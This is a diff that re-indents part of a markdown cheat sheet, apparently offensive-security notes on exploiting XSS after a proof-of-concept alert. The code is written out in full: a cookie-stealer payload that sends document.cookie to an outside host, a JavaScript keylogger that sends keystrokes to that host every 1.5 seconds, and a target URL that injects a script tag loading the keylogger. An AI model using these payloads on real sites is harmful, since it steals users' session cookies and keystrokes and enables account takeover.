@@ -8,29 +8,27 @@ After getting your xss alert box, what's next? This is not usually enough to "sh
 ## Techniques (code)
 
 - Cookie Stealer
-```js
-<img src=x onerror=this.src='http://5.5.5.5/?cookie='+document.cookie>
-```
-
-
+  ```js
+  <img src=x onerror=this.src='http://5.5.5.5/?cookie='+document.cookie>
+  ```
 
 - Record key stokes
-Add this to a js file
-```js
-var data = '';
-document.onkeypress = function(e) {
-  var w = window.event ? event : e;
-  var keystroke = w.keyCode ? w.keyCode : w.charCode;
-  keystroke = String.fromCharCode(keystroke);
-  data = data + keystroke;
-}
-window.setInterval(function(){
-    new Image().src = 'http://5.5.5.5/?c=' + data;
-    data = '';
-}, 1500);
-```
-Then call the script in using xss
-```js
-http://target.site/welcome.php?user=admin<script src>'http://5.5.5.5/keylogger.js'></script>
-```
+  Add this to a js file
+  ```js
+  var data = '';
+  document.onkeypress = function(e) {
+    var w = window.event ? event : e;
+    var keystroke = w.keyCode ? w.keyCode : w.charCode;
+    keystroke = String.fromCharCode(keystroke);
+    data = data + keystroke;
+  }
+  window.setInterval(function(){
+      new Image().src = 'http://5.5.5.5/?c=' + data;
+      data = '';
+  }, 1500);
+  ```
+  Then call the script in using xss
+  ```js
+  http://target.site/welcome.php?user=admin<script src>'http://5.5.5.5/keylogger.js'></script>
+  ```
 
